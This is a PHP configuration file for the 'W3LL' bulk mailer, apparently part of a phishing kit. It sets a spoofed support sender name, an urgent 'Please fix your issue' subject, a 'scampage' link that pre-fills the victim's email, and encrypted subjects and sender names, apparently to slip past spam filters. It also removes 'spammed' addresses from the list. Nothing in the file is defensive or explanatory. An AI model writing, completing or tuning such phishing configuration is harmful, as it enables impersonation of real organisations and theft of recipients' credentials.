<?php
/* W3LL Features SETUP */

// PLEASE READ FILE [README.txt] BEFORE USE

include 'token.php';
include 'settings.php';

//Setup
$W3LL_setup = [
"fromname"=> [

// MULTI FROM NAME

"++w3ll_domain1++ Support", //FROMNAME 1


],

"frommail"=> "++w3ll_smtp++",

"subject"=> [

// MULTI SUBJECT

"Please fix your issue (++w3ll_date++) id: #++w3ll_randstring++", //SUBJECT 1

],

"mail_list"=> $mail_list,"msgfile"=> $msg_file, "attach" => $attachment,

"scampage"=> $scampage,

"priority"=> 1,   // (1= High Priority.  0 = Normal Priority.)

"sleeptime"=> 7, // (Delay Per Email, Default 5)

"ratio" => 1, // (Ratio Email Per Delay, Default 1)

"userremoveline" => 1, // (1= Remove Spammed Email From List.)

"filesend" => 0, // (1= Send Attachment File.)

"redirect" => 1, //(1 = Use auto page link [?email=]. 0 = Dont use ?email=)

"subject_encrypt" => 1, //(1= Encrypt Email Subject)

"fromname_encrypt" => 1, //(1= Encrypt Email Fromname)

"replacement" => 1, //(1= Use Replacement Function. Ex:++w3ll_short++)

];

/* END */


?>